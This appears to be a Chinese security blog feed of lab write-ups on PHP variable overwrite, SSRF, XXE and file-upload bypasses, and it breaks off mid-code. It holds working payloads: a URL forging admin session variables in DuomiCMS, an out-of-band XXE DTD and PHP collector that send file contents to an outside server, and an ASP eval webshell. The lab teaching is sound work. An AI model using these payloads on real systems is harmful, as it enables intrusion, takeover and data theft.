        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="什么是变量覆盖"><a href="#什么是变量覆盖" class="headerlink" title="什么是变量覆盖"></a><strong>什么是变量覆盖</strong></h1><p><strong>变量覆盖指的是可以用自定义的参数值替换程序原有的变量值</strong></p><h3 id="怎么去寻找变量覆盖？"><a href="#怎么去寻找变量覆盖？" class="headerlink" title="怎么去寻找变量覆盖？"></a><strong>怎么去寻找变量覆盖？</strong></h3><p><strong>经常导致变量覆盖漏洞场景又：$$使用不当，extracat()函数使用不当，parse_str()函数使用不当import_request_variables()使用不当，开启了全局变量注册等。</strong></p><p><strong>变量覆盖漏洞有的时候可以直接让我们获取webshell，那单服务器的权限</strong></p><h1 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a><strong>函数解析</strong></h1><p><strong>经常引起变量覆盖漏洞的函数有：extracat()，parse_str()，import_request_variables()</strong></p><p><strong>extract()函数（作用：从数组中导入变量到当前的符号表）</strong></p><h4 id="给一个实例："><a href="#给一个实例：" class="headerlink" title="给一个实例："></a><strong>给一个实例：</strong></h4><blockquote><p><strong>&lt;?php</strong></p><p><strong>$a = “Original”;</strong></p><p><strong>$my_array = array(“a” =&gt; “Cat”,”b” =&gt; “Dog”,”c” =&gt;”Horse”);</strong></p><p><strong>extaract($my_array);</strong></p><p><strong>echo “\$a = $a;  \$b=​$b; \$c=$c”;</strong></p><p><strong>?&gt;</strong></p></blockquote><h4 id="运行结果：-a-Cat-b-Dog-c-Horse"><a href="#运行结果：-a-Cat-b-Dog-c-Horse" class="headerlink" title="运行结果：$a=Cat; $b=Dog; $c=Horse"></a><strong>运行结果：$a=Cat; $b=Dog; $c=Horse</strong></h4><p><strong>parse_str() 将查询字符解析到变量中：</strong></p><blockquote><p><strong>&lt;?php</strong><br><strong>parse_str(“n=z&amp;a=60”);</strong></p><p><strong>echo $n;</strong></p><p><strong>echo $a;</strong><br><strong>?&gt;</strong></p></blockquote><p><strong>输出了z和60</strong></p><blockquote><p><strong>那么parse_str(“name=Bill&amp;age=60”) 相当于完成了$n = ‘n’和​$a=’60’</strong></p></blockquote><p><strong>$$ 特殊符号搭配问题：</strong></p><blockquote><p><strong><code>&lt;?php</code></strong></p><p><strong><code>$a=1;</code></strong></p><p><strong><code>foreach(array(&#39;__COOKIE&#39;,&#39;__POST&#39;,&#39;__GEI&#39;)as$_request){</code></strong></p><p><strong><code>foreach($$_request as $_key=&gt;$value)</code></strong></p><p><strong><code>{$$_key=addslashes($_value);}}</code></strong></p><p><strong><code>echo $a;</code></strong></p><p><strong><code>}</code></strong></p></blockquote><p><strong>这个代码会接受我们的GEI提交、POST提交、COOKIE参数、将这个接受来的参数依次放入<code>$_request $_key=&gt;$value</code> 这是个数组解析、实际上就是键值分离</strong></p><p>​    <strong><code>$a=1</code>是一个定值，但是因为<code>$$_key</code>的缘故，当我传参a=2;那么<code>$_key=addslashes($_value);</code>就变成<code>$a=2</code></strong></p><p><strong>(PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0)</strong></p><p><strong>import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中</strong></p><h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a><strong>靶场实战</strong></h1><p><strong>这种变量覆盖的漏洞大多是白盒测试，这里选择在DuomiCMS2.0中进行。</strong></p><p><strong>使用seay代码审计工具去快速找到危险函数，这里是变量覆盖，可以加个规则匹配$$的规则：<code>([^\$&quot;]|$)\$\{?\$</code></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖01.png" alt="躲起来了"></strong></p><p><strong>扫描后发现foreach函数，可能就存在$$变量覆盖的问题</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖02.png" alt="躲起来了"></strong></p><p><strong>有联系的可利用，包含文件</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖03.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖04.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖05.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖06.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖07.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖08.png" alt="躲起来了"></strong></p><p><strong>一系列追踪发现可以自己生成session到check.admin.php调用，并与id绑定，获取管理员账号。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin</span><br></pre></td></tr></table></figure><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖09.png" alt="躲起来了"></strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/变量覆盖10.png" alt="躲起来了"></strong></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 就很烦 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF - 服务器端请求伪造</title>
      <link href="/2019/05/21/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2019/05/21/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="SSRF漏洞是如何产生的？"><a href="#SSRF漏洞是如何产生的？" class="headerlink" title="SSRF漏洞是如何产生的？"></a>SSRF漏洞是如何产生的？</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>简述：SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现在这个请求是合法的，然后<strong>服务器以他的身份来访问其他服务器的资源</strong>。</p><h4 id="网站访问大致步骤："><a href="#网站访问大致步骤：" class="headerlink" title="网站访问大致步骤："></a>网站访问大致步骤：</h4><p>用户在地址栏输入网址 –》 向目标网站发送请求 –》 目标网站接受请求并在服务器端验证请求是否合法，然后返回用户所需要的页面 –》用户接收页面并在浏览器中显示</p><h2 id="SSRF漏洞的验证方法："><a href="#SSRF漏洞的验证方法：" class="headerlink" title="SSRF漏洞的验证方法："></a>SSRF漏洞的验证方法：</h2><p>1）因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p><p>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><p><code>部分内容摘自其他网站</code></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 天气好呀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE - 实体注入</title>
      <link href="/2019/05/19/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/05/19/XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a><strong>XML基础知识</strong></h1><p><strong>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xxe01.png" alt="躲起来了"></strong></p><p><strong>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</strong></p><p><strong>内部声明DTD</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p><strong>引用外部DTD</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</strong></p><p><strong>内部声明实体</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>引用外部实体</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><hr><p><strong>在知道了解了xml后，就可以发现，当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</strong></p><hr><h2 id="接下来就利用靶场进行XXE-实体注入（利用掌控者的封神台靶场）"><a href="#接下来就利用靶场进行XXE-实体注入（利用掌控者的封神台靶场）" class="headerlink" title="接下来就利用靶场进行XXE - 实体注入（利用掌控者的封神台靶场）"></a><strong>接下来就利用靶场进行XXE - 实体注入（利用掌控者的<a href="https://hack.zkaq.org/?a=battle" target="_blank" rel="noopener">封神台</a>靶场）</strong></h2><h3 id="查看代码："><a href="#查看代码：" class="headerlink" title="查看代码："></a><strong>查看代码：</strong></h3><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xxe02.png" alt="躲起来了"></strong></p><p><strong>simplexml_load_string() 函数是把 XML 字符串载入对象中。</strong></p><p><strong>如果失败，则返回 false。</strong></p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a><strong>语法</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simplexml_load_file(string,class,options,ns,is_prefix)</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>参数</strong></th><th style="text-align:right"><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>string</strong></td><td style="text-align:right"><strong>必需。规定要使用的 XML 字符串。</strong></td></tr><tr><td><strong>class</strong></td><td style="text-align:right"><strong>可选。规定新对象的 class。</strong></td></tr><tr><td><strong>options</strong></td><td style="text-align:right"><strong>可选。规定附加的 Libxml 参数。</strong></td></tr><tr><td><strong>ns</strong></td><td style="text-align:right"><strong>可选。</strong></td></tr><tr><td><strong>is_prefix</strong></td><td style="text-align:right"><strong>可选。</strong></td></tr></tbody></table><p><strong>该函数回去读取post请求数据，并将post请求数据通过 simplexml_load_string() 函数转换为XML有关的对象，</strong></p><p><strong>其中，也没有禁止xml数据中使用外部实体（例如使用libxml_disable_entity_loader(true)），也没有过滤用户提交的XML数据。因此可以进行XXE注入。</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xxe03.png" alt="躲起来了"></strong></p><p><strong>改POST请求</strong></p><p><strong>1.xml内容如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://**********/xxe/2.php?id=%file;&apos;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p><strong>2.php如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&quot;id&quot;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure><p><strong>最后到自己公网上的服务器上看成功与否</strong></p><p><strong><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/xxe04.png" alt="躲起来了"></strong></p><p><strong>得到一串字符，进行base64解码</strong></p><p><strong>成功得到poc上的对方服务器的文件内容</strong></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 无聊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞----解析、验证伪造（三）</title>
      <link href="/2019/05/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2019/05/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="文件上传漏洞–-gt-接上篇博客"><a href="#文件上传漏洞–-gt-接上篇博客" class="headerlink" title="文件上传漏洞–&gt;接上篇博客"></a>文件上传漏洞–&gt;接上篇博客</h1><h2 id="20、21、23IIS6-0解析漏洞"><a href="#20、21、23IIS6-0解析漏洞" class="headerlink" title="20、21、23IIS6.0解析漏洞"></a>20、21、23IIS6.0解析漏洞</h2><ul><li>在文件夹为 asp, asa 内的所有文件都会被当成asp脚本进行解析;</li><li>文件名如：xxx.asp;yyy.jpg 的文件，会忽略分号后面的后缀，将该文件当成asp脚本进行解析</li><li>asa、cer、cdx 也会被当成asp脚本进行解析</li></ul><h3 id="附上源码："><a href="#附上源码：" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>,<span class="string">"asa"</span>,<span class="string">"cer"</span>,<span class="string">"cdx"</span>);</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>];</span><br><span class="line">$extension = end($temp);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">&amp;&amp; in_array($extension, $allowedExts))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件类型: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件大小: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" kB"</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">"./a/image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" 文件已经存在。 "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">            $ret = move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . <span class="string">"./a/image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><p>可以看到支持上传的后缀名有：gif、jpeg、jpg、png、asa、cer、cdx，但同时还要满足http请求头Content-Type的值为 image/jpg 、image/png 等图片类型。</p><p>20、直接将一句话木马保存为 xxx.cer 文件,改http请求头Content-Type的值为image/jpg 、image/png 等即可。</p><p>21、xxx.asp;yyy.jpg 的文件</p><p>23、 asp, asa 内的所有文件都会被当成asp脚本进行解析，所以直接上传图片马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;a&quot;)%&gt;</span><br></pre></td></tr></table></figure><h2 id="24、解析漏洞（四）"><a href="#24、解析漏洞（四）" class="headerlink" title="24、解析漏洞（四）"></a>24、解析漏洞（四）</h2><p>在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于C:wampbinphpphp5.3.10php.ini，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析，也就是说可以这样，上传合法的“图片”（图片木马）然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。</p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 暗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞----解析、验证伪造（二）</title>
      <link href="/2019/05/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2019/05/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E4%BC%AA%E9%80%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="文件上传漏洞–-gt-接上篇博客"><a href="#文件上传漏洞–-gt-接上篇博客" class="headerlink" title="文件上传漏洞–&gt;接上篇博客"></a>文件上传漏洞–&gt;接上篇博客</h1><h2 id="11、-00截断绕过"><a href="#11、-00截断绕过" class="headerlink" title="11、%00截断绕过"></a>11、%00截断绕过</h2><p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。</p><h3 id="附上源码："><a href="#附上源码：" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &apos;上传失败！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><p>在POST做00截断</p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload01.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload02.png" alt></p><h2 id="12、-00截断绕过-二"><a href="#12、-00截断绕过-二" class="headerlink" title="12、%00截断绕过(二)"></a>12、%00截断绕过(二)</h2><p>和上关差不多，这里用Hex改为00就行了</p><h3 id="附上源码：-1"><a href="#附上源码：-1" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-1"><a href="#方法：-1" class="headerlink" title="方法："></a>方法：</h3><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload03.png" alt="躲起来了"></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/upload04.png" alt="躲起来了"></p><h2 id="13-16、（图片马绕过）（getimagesize图片类型绕过）（php-exif模块图片类型绕过）（二次渲染绕过）"><a href="#13-16、（图片马绕过）（getimagesize图片类型绕过）（php-exif模块图片类型绕过）（二次渲染绕过）" class="headerlink" title="13-16、（图片马绕过）（getimagesize图片类型绕过）（php_exif模块图片类型绕过）（二次渲染绕过）"></a>13-16、（图片马绕过）（getimagesize图片类型绕过）（php_exif模块图片类型绕过）（二次渲染绕过）</h2><h3 id="getimagesize图片类型绕过："><a href="#getimagesize图片类型绕过：" class="headerlink" title="getimagesize图片类型绕过："></a>getimagesize图片类型绕过：</h3><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br></pre></td></tr></table></figure><p>所以用cmd命令来做图片马</p><h3 id="hp-exif模块图片类型绕过："><a href="#hp-exif模块图片类型绕过：" class="headerlink" title="hp_exif模块图片类型绕过："></a>hp_exif模块图片类型绕过：</h3><p><strong>exif_imagetype()</strong> 读取一个图像的第一个字节并检查其签名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$image_type = exif_imagetype($filename);</span><br></pre></td></tr></table></figure><p>和上关一样的图片马即可</p><h3 id="二次渲染绕过："><a href="#二次渲染绕过：" class="headerlink" title="二次渲染绕过："></a>二次渲染绕过：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                $newimagepath = 